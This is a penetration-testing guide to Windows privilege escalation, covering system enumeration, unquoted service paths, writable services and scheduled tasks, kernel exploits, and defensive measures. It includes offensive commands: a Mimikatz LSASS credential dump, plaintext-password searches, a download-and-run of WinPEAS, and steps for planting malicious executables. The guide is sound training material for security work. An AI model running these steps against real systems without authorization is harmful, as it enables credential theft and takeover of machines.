Windows Privilege Escalation involves leveraging misconfigurations, vulnerabilities, or features in Windows systems to elevate an unprivileged user account to one with administrative or SYSTEM-level privileges. This guide focuses on fundamental techniques to achieve privilege escalation during penetration testing.

---

### **1. Overview of Privilege Escalation**

- **Objective**:
    - Gain higher privileges (e.g., administrator or SYSTEM) on the target system.
    - Access restricted files, execute sensitive operations, or create persistence mechanisms.
- **General Strategy**:
    1. **Enumerate the System**: Gather information about the operating system, installed software, users, and configurations.
    2. **Identify Opportunities**: Look for vulnerabilities, misconfigurations, or weak credentials.
    3. **Exploit Findings**: Leverage identified issues to escalate privileges.

---

### **2. Enumeration: Gathering Information**

### **a. System Information**

- Collect basic system details:
    
    ```powershell
    systeminfo
    Get-ComputerInfo
    
    ```
    
- Check patch levels and missing updates:
    
    ```powershell
    wmic qfe list
    
    ```
    

### **b. User and Group Information**

- Identify logged-in users:
    
    ```powershell
    query user
    whoami /all
    
    ```
    
- List local administrators:
    
    ```powershell
    net localgroup administrators
    Get-LocalGroupMember -Group Administrators
    
    ```
    

### **c. Scheduled Tasks**

- Look for scheduled tasks that run with elevated privileges:
    
    ```powershell
    schtasks /query /fo LIST /v
    
    ```
    

### **d. Installed Software**

- List installed programs:
    
    ```powershell
    Get-WmiObject Win32_Product
    
    ```
    
- Check for software with known vulnerabilities.

### **e. Running Services**

- Enumerate services:
    
    ```powershell
    Get-Service
    sc query
    
    ```
    
- Identify services running as SYSTEM or vulnerable to exploitation.

---

### **3. Common Privilege Escalation Techniques**

### **a. Exploiting Misconfigured Services**

1. **Unquoted Service Paths**:
    - If a service path contains spaces and is unquoted, it may allow privilege escalation by injecting a malicious executable.
    - Check for unquoted paths:
        
        ```powershell
        wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v """
        
        ```
        
    - Exploit:
        - Create a malicious executable in the unquoted path segment.
        - Restart the service to execute your payload.
2. **Service with Writable Permissions**:
    - Check if you can modify the service executable or configuration:
        
        ```powershell
        sc qc <service_name>
        
        ```
        
    - Replace the executable with a malicious one.

---

### **b. Exploiting Vulnerable Applications**

- Look for outdated or vulnerable software installed on the system (e.g., exploits for **CVE-2021-1675** PrintNightmare).

---

### **c. Abusing Credentials**

1. **Stored Credentials**:
    - Search for plaintext credentials in files or scripts:
        
        ```powershell
        findstr /si "password" *.txt
        
        ```
        
    - Check browser credentials or saved RDP sessions.
2. **LSASS Dumping**:
    - Extract credentials from memory using tools like **Mimikatz**.
    
    ```powershell
    mimikatz.exe "sekurlsa::logonpasswords" exit
    
    ```
    

---

### **d. Exploiting Scheduled Tasks**

- Identify tasks with writable paths or elevated privileges.
- Replace the executable or script in the task's path.

---

### **e. Weak Permissions**

1. **Writable Directories**:
    - Identify directories writable by the current user.
    
    ```powershell
    icacls C:\\path\\to\\directory
    
    ```
    
    - Place a malicious executable in writable directories used by services or scheduled tasks.
2. **Registry Keys**:
    - Check for weak permissions on registry keys that control services or startup programs.
    
    ```powershell
    reg query HKLM\\SYSTEM\\CurrentControlSet\\Services
    
    ```
    

---

### **f. Kernel Exploits**

- Identify the Windows version and kernel patch level.
- Use public exploit databases (e.g., Exploit-DB) to find suitable exploits.
    - Example: **CVE-2021-36934** (HiveNightmare) exploits improper permissions on SAM files.

---

### **4. Automation Tools**

### **a. Windows Enumeration Scripts**

1. **WinPEAS**:
    - Comprehensive script for privilege escalation enumeration.
    
    ```powershell
    iwr -Uri <https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe> -OutFile winPEASany.exe
    ./winPEASany.exe
    
    ```
    
2. **Seatbelt**:
    - Post-exploitation enumeration tool.
    
    ```powershell
    .\\Seatbelt.exe all
    
    ```
    

### **b. Exploitation Frameworks**

- **Metasploit**:
    - Use post-exploitation modules for privilege escalation.
- **PowerSploit**:
    - Collection of PowerShell scripts for exploitation.
    
    ```powershell
    Import-Module PowerSploit
    Invoke-ServiceAbuse
    
    ```
    

---

### **5. Exploitation Examples**

### **Example 1: Unquoted Service Path**

1. Identify a service with an unquoted path:
    
    ```
    Path: C:\\Program Files\\Vulnerable App\\service.exe
    
    ```
    
2. Place a malicious executable in `C:\\Program.exe`.
3. Restart the service:
    
    ```powershell
    net stop <service_name>
    net start <service_name>
    
    ```
    

---

### **Example 2: Privilege Escalation via Writable Service**

1. Identify a writable service path:
    
    ```
    Binary Path: C:\\Vulnerable\\Service.exe
    
    ```
    
2. Replace `Service.exe` with a malicious payload.
3. Restart the service.

---

### **6. Defense Against Privilege Escalation**

### **a. Secure Configuration**

- Apply principle of least privilege (POLP) for users and services.
- Enforce strong password policies.

### **b. Patch Management**

- Regularly update and patch operating systems and applications.

### **c. File and Registry Permissions**

- Audit permissions on sensitive files, directories, and registry keys.

### **d. Monitoring and Alerts**

- Monitor for suspicious activity (e.g., service restarts, new scheduled tasks).

---

### **7. Ethical Considerations**

- **Authorized Testing Only**:
    - Ensure privilege escalation is within the engagement scope.
- **Avoid Irreversible Changes**:
    - Be cautious when modifying services or files.
- **Document Findings**:
    - Provide detailed reports to assist with remediation.

